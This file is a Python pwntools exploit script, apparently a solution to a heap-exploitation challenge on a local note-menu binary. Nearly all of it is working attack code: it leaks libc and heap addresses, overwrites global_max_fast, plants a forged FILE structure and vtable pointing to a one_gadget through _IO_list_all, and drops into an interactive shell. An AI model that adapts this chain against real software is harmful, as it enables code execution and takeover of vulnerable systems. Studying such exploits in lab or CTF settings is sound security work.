#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = "./a83f5901-8f95-49cc-8525-89fef33eef71.test"
elf = context.binary 
libc = elf.libc
libc.sym['main_arena'] = 0x3c4b20
libc.sym['global_max_fast'] = 0x3c67f8
libc.sym['one_gadget'] = 0xf02a4

def add(size, cont):
    io.sendlineafter("4.exit\n", "1")
    io.sendlineafter("size\n", str(size))
    sleep(0.01)
    if len(cont) == size:
        io.sendafter("note\n", cont)
        sleep(0.01)
    else:
        io.sendlineafter("note\n", cont)


def delete(idx):
    io.sendlineafter("4.exit\n", "2")
    io.sendlineafter("id:\n", str(idx))

def login(name):
    io.sendlineafter("4.exit\n", "3")
    sleep(0.01)
    io.sendafter("name\n", name)
    sleep(0.01)
    io.sendlineafter("admin\n", "0")

def _exit():
    io.sendlineafter("4.exit\n", "4")


#  context.log_level = "debug"
io = process("./a83f5901-8f95-49cc-8525-89fef33eef71.test")
add(0xf0, '0' * 0xf0)
add(0xf0, '1' * 0xf0)
add(0xf0, '2' * 0xf0)
add(0xf0, '3' * 0xf0)
delete(0)
add(0xf0, '0' * 8)
io.recvuntil("0" * 8)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['main_arena'] - 88
success("libc @ {:#x}".format(libc.address))
fastbinsY = libc.sym['main_arena'] + 0x8
success("fastbinsY @ {:#x}".format(fastbinsY))

delete(0)
delete(2)

add(0xf0, 'xxxxxxxx\xff')
io.recvuntil("xxxxxxxx")
heap = u64(io.recvuntil("\n", drop = True).ljust(8, '\x00')) >> 12 << 12
success("heap @ {:#x}".format(heap))

idx = (libc.sym['_IO_list_all'] - 8 - fastbinsY) / 8
size = idx * 0x10 + 0x20

fake_file = flat('\0' * 16, 0, 1, '\0' * 0xa8, heap + 0x4e0)
fake_vtable = flat(libc.sym['one_gadget']) * 0x20
add(size, fake_file + fake_vtable)

login(flat('aaaaaaaa', libc.sym['global_max_fast'] - 8))

delete(2)
_exit()

io.interactive()
